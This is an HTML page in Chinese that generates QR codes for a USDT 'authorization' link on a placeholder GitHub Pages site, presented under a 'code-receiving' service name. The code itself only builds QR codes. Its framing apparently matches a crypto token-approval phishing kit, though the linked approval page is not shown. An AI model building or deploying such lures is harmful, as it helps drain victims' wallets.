<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>專業海內外接碼 - 授權 QR 生成器</title>
<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
<style>
body { font-family: Arial, sans-serif; text-align: center; padding: 40px; }
input { padding: 10px; font-size: 16px; width: 220px; margin-top: 10px; }
button { padding: 10px 20px; font-size: 16px; margin-top: 10px; }
#qrcode { margin-top: 20px; }
</style>
</head>
<body>

<h2>專業海內外接碼</h2>
<p>輸入授權金額（USDT）生成專屬授權 QR</p>

<input type="number" id="amount" placeholder="例如 100.5" step="0.000001" min="0.000001">
<br>
<button onclick="generateQR()">生成授權 QR</button>

<div id="qrcode"></div>

<script>
// 自行修改成你 GitHub Pages 的授權頁 URL
const basePage = "https://你的帳號.github.io/usdt-pay/auto.html"

function generateQR(){
  const amount = document.getElementById("amount").value
  if(!amount || amount<=0){
    alert("請輸入正確金額")
    return
  }
  const url = `${basePage}?amount=${encodeURIComponent(amount)}`
  const qrContainer = document.getElementById("qrcode")
  qrContainer.innerHTML = ""
  QRCode.toCanvas(document.createElement("canvas"), url, function(err, canvas){
    if(err){ alert("生成失敗"); return }
    qrContainer.appendChild(canvas)
  })
}
</script>

</body>
</html>
